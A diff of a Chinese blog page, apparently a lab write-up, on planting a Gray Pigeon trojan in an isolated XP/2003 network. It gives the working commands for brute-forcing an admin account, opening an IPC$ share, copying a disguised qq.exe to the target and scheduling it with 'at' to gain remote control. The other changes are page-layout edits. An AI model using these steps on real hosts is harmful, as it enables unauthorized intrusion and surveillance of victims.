@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：3 个月前
+                  本文最后更新于：5 天前
                 
               </p>
             
@@ -249,15 +249,15 @@
               <h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><a id="more"></a>
 <h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
 <p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
-<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/3.png" srcset="/img/loading.gif" alt><br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/4.png" srcset="/img/loading.gif" alt></p>
-<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/2.png" srcset="/img/loading.gif" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
+<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" srcset="/img/loading.gif" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" srcset="/img/loading.gif" alt></p>
+<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" srcset="/img/loading.gif" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
 <p>获取账号密码<br>username：administrator<br>password: “”</p>
 <h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
 <h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
 <h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
 <h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
-<p>获取屏幕内容<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/5.png" srcset="/img/loading.gif" alt></p>
-<p>控制命令行<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/6.png" srcset="/img/loading.gif" alt></p>
+<p>获取屏幕内容<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" srcset="/img/loading.gif" alt></p>
+<p>控制命令行<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" srcset="/img/loading.gif" alt></p>
 
             </div>
             <hr>
@@ -310,7 +310,7 @@
   <div id="vcomments"></div>
   <script type="text/javascript">
     function loadValine() {
-      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
         new Valine({
           el: "#vcomments",
           app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
@@ -324,6 +324,9 @@
           highlight: true,
           recordIP: false,
           serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
         });
       });
     }
@@ -577,7 +580,43 @@
 
 
 
-
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 </html>
